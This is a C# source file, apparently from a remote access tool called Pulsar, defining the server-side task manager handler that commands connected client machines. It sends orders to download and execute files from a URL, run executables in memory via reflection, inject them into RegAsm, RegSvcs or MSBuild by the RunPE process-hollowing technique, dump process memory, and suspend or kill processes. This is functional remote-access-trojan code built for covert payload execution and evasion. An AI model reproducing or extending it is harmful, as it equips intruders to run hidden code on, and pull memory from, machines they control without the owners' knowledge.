using System;
using System.IO;
using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Models;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with remote tasks.
    /// </summary>
    public class TaskManagerHandler : MessageProcessorBase<Process[]>, IDisposable
    {
        /// <summary>
        /// Represents the method that will handle the result of a process action.
        /// </summary>
        /// <param name="sender">The message processor which raised the event.</param>
        /// <param name="action">The process action which was performed.</param>
        /// <param name="result">The result of the performed process action.</param>
        public delegate void ProcessActionPerformedEventHandler(object sender, ProcessAction action, bool result);

        /// <summary>
        /// Raised when a result of a started process is received.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event ProcessActionPerformedEventHandler ProcessActionPerformed;

        public delegate void OnResponseReceivedEventHandler(object sender, DoProcessDumpResponse response);

        public event OnResponseReceivedEventHandler OnResponseReceived;

        /// <summary>
        /// Reports the result of a started process.
        /// </summary>
        /// <param name="action">The process action which was performed.</param>
        /// <param name="result">The result of the performed process action.</param>
        private void OnProcessActionPerformed(ProcessAction action, bool result)
        {
            SynchronizationContext.Post(r =>
            {
                var handler = ProcessActionPerformed;
                handler?.Invoke(this, action, (bool)r);
            }, result);
        }

        /// <summary>
        /// The client which is associated with this remote execution handler.
        /// </summary>
        private readonly Client _client;

        /// <summary>
        /// Initializes a new instance of the <see cref="TaskManagerHandler"/> class using the given client.
        /// </summary>
        /// <param name="client">The associated client.</param>
        public TaskManagerHandler(Client client) : base(true)
        {
            _client = client;
        }

        public override bool CanExecute(IMessage message) => message is DoProcessResponse ||
                                                             message is GetProcessesResponse ||
                                                             message is DoProcessDumpResponse;

        public override bool CanExecuteFrom(ISender sender) => _client.Equals(sender);

        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoProcessResponse execResp:
                    Execute(sender, execResp);
                    break;
                case GetProcessesResponse procResp:
                    Execute(sender, procResp);
                    break;
                case DoProcessDumpResponse procResp:
                    Execute(sender, procResp);
                    break;
            }
        }

        /// <summary>
        /// Starts a new process remotely.
        /// </summary>
        /// <param name="remotePath">The remote path used for starting the new process.</param>
        /// <param name="isUpdate">Decides whether the process is a client update.</param>
        /// <param name="executeInMemory">Execute in memory using .NET reflection.</param>
        /// <param name="useRunPE">Execute using RunPE technique.</param>
        /// <param name="runPETarget">Target process for RunPE (a=RegAsm, b=RegSvcs, c=MSBuild, d=custom).</param>
        /// <param name="runPECustomPath">Custom path when runPETarget is 'd'.</param>
        public void StartProcess(string remotePath, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
        {
            byte[] fileBytes = null;
            
            if (File.Exists(remotePath))
            {
                fileBytes = File.ReadAllBytes(remotePath);
            }
            
            string fileExtension = Path.GetExtension(remotePath);
            
            if ((executeInMemory || useRunPE) && !string.Equals(fileExtension, ".exe", StringComparison.OrdinalIgnoreCase))
            {
                System.Windows.Forms.MessageBox.Show("Only .exe files are allowed for RunPE or reflection execution.", "Invalid File Type", 
                    System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                return;
            }
            
            _client.Send(new DoProcessStart 
            { 
                FileBytes = fileBytes,
                IsUpdate = isUpdate, 
                ExecuteInMemoryDotNet = executeInMemory,
                UseRunPE = useRunPE,
                RunPETarget = runPETarget,
                RunPECustomPath = runPECustomPath,
                FileExtension = fileExtension
            });
        }

        /// <summary>
        /// Downloads a file from the web and executes it remotely.
        /// </summary>
        /// <param name="url">The URL to download and execute.</param>
        /// <param name="isUpdate">Decides whether the file is a client update.</param>
        /// <param name="executeInMemory">Execute in memory using .NET reflection.</param>
        /// <param name="useRunPE">Execute using RunPE technique.</param>
        /// <param name="runPETarget">Target process for RunPE (a=RegAsm, b=RegSvcs, c=MSBuild, d=custom).</param>
        /// <param name="runPECustomPath">Custom path when runPETarget is 'd'.</param>
        public void StartProcessFromWeb(string url, bool isUpdate = false, bool executeInMemory = false, bool useRunPE = false, string runPETarget = "a", string runPECustomPath = null)
        {
            if (executeInMemory || useRunPE)
            {
                System.Windows.Forms.MessageBox.Show("RunPE and reflection execution are not allowed for web downloads.", "Invalid Operation", 
                    System.Windows.Forms.MessageBoxButtons.OK, System.Windows.Forms.MessageBoxIcon.Error);
                return;
            }

            _client.Send(new DoProcessStart 
            { 
                DownloadUrl = url, 
                IsUpdate = isUpdate, 
                ExecuteInMemoryDotNet = executeInMemory,
                UseRunPE = useRunPE,
                RunPETarget = runPETarget,
                RunPECustomPath = runPECustomPath
            });
        }
        public void SetTopMost(int pid, bool enable = true)
        {
            _client.Send(new DoSetTopMost { Pid = pid, Enable = enable });
        }

        /// <summary>
        /// Refreshes the current started processes.
        /// </summary>
        public void RefreshProcesses()
        {
            _client.Send(new GetProcesses());
        }

        /// <summary>
        /// Ends a started process given the process id.
        /// </summary>
        /// <param name="pid">The process id to end.</param>
        public void EndProcess(int pid)
        {
            _client.Send(new DoProcessEnd { Pid = pid });
        }

        /// <summary>
        /// Dumps a running processes memory.
        /// </summary>
        /// <param name="pid">The process id to dump.</param>
        public void DumpProcess(int pid)
        {
            _client.Send(new DoProcessDump { Pid = pid });
        }

        public void SuspendProcess(int pid)
        {
            _client.Send(new DoSuspendProcess { Pid = pid });
        }

        private void Execute(ISender client, DoProcessResponse message)
        {
            OnProcessActionPerformed(message.Action, message.Result);
        }

        public GetProcessesResponse LastProcessesResponse { get; private set; }

        private void Execute(ISender client, GetProcessesResponse message)
        {
            LastProcessesResponse = message;
            OnReport(message.Processes);
        }

        private void Execute(ISender client, DoProcessDumpResponse message)
        {
            OnResponseReceived?.Invoke(this, message);
        }

        /// <summary>
        /// Disposes all managed and unmanaged resources associated with this message processor.
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                // Clear event handlers to prevent memory leaks
                ProcessActionPerformed = null;
                OnResponseReceived = null;
                
                // Clear the last response to help with garbage collection
                LastProcessesResponse = null;
            }
        }
    }
}
